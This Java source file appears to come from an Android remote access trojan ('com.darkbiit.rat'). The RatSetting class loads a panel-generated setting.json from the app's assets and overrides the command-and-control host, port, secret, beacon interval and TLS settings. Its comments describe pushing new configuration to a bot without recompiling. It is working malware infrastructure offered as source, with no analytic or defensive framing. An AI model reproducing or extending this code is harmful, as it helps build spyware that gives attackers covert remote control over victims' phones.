package com.darkbiit.rat;

import android.content.Context;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Runtime configuration loaded from assets/setting.json.
 *
 * The compiler writes the panel-generated setting.json into the APK's assets
 * and also bakes the same values into RatCfg's smali. This class lets the
 * payload prefer the asset when it is present, so a new configuration can be
 * shipped by pushing a new file to the bot's assets directory without a
 * recompile; the baked values stay as the fallback.
 *
 * Expected layout:
 * {
 *   "version": 1,
 *   "server": {
 *     "host": "10.0.2.2",
 *     "port": 8777,
 *     "protocol": "tcp",        // tcp | tls
 *     "secret": "...",
 *     "beacon_ms": 15000,
 *     "timeout_ms": 10000,
 *     "tag": "rat"
 *   }
 * }
 *
 * A flat layout (host/port at the top level) is accepted as well.
 */
public final class RatSetting {

    private static final String ASSET_NAME = "setting.json";

    private static boolean loaded = false;
    private static Map<String, Object> data = null;
    private static String error = null;

    private RatSetting() {
    }

    /** Loads the asset once. Safe to call from any thread. */
    public static synchronized void load(Context ctx) {
        if (loaded) {
            return;
        }
        loaded = true;
        if (ctx == null) {
            error = "no context";
            return;
        }
        try {
            InputStream in = ctx.getAssets().open(ASSET_NAME);
            try {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = in.read(buf)) > 0) {
                    bos.write(buf, 0, n);
                }
                String text = new String(bos.toByteArray(), "UTF-8");
                Map<String, Object> m = RatJson.decodeObject(text);
                apply(m);
                data = m;
                RatLog.i("setting.json loaded from assets");
            } finally {
                in.close();
            }
        } catch (IOException e) {
            error = "no " + ASSET_NAME + " in assets (" + e.getMessage() + "), using baked config";
            RatLog.i(error);
        } catch (Throwable t) {
            error = t.getClass().getSimpleName() + ": " + t.getMessage();
            RatLog.w("setting.json parse failed: " + error);
        }
    }

    /** The parsed document, or null when the asset is absent. */
    public static synchronized Map<String, Object> get() {
        return data;
    }

    /** Why the asset was not used, or null when it was. */
    public static synchronized String getError() {
        return error;
    }

    /** Copies the server block into RatCfg. */
    private static void apply(Map<String, Object> root) {
        Map<String, Object> srv = getMap(root, "server");
        if (srv == null || srv.isEmpty()) {
            srv = root; // flat layout
        }

        String host = RatJson.getString(srv, "host", null);
        if (host != null && host.length() > 0) {
            RatCfg.C2_HOST = host;
        }
        int port = RatJson.getInt(srv, "port", -1);
        if (port > 0 && port < 65536) {
            RatCfg.C2_PORT = port;
        }
        String secret = RatJson.getString(srv, "secret", null);
        if (secret != null && secret.length() > 0) {
            RatCfg.SECRET = secret;
        }
        String proto = RatJson.getString(srv, "protocol", "tcp");
        RatCfg.USE_WSS = "tls".equalsIgnoreCase(proto)
                || "ssl".equalsIgnoreCase(proto)
                || "wss".equalsIgnoreCase(proto);
        int beacon = RatJson.getInt(srv, "beacon_ms", -1);
        if (beacon >= 1000) {
            RatCfg.BEACON_INTERVAL_MS = beacon;
        }
        int timeout = RatJson.getInt(srv, "timeout_ms", -1);
        if (timeout >= 1000) {
            RatCfg.CONNECT_TIMEOUT_MS = timeout;
        }
        String tag = RatJson.getString(srv, "tag", null);
        if (tag != null && tag.length() > 0) {
            RatCfg.TAG = tag;
        }
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> getMap(Map<String, Object> m, String key) {
        if (m == null) {
            return null;
        }
        Object v = m.get(key);
        if (v instanceof Map) {
            return (Map<String, Object>) v;
        }
        return null;
    }
}
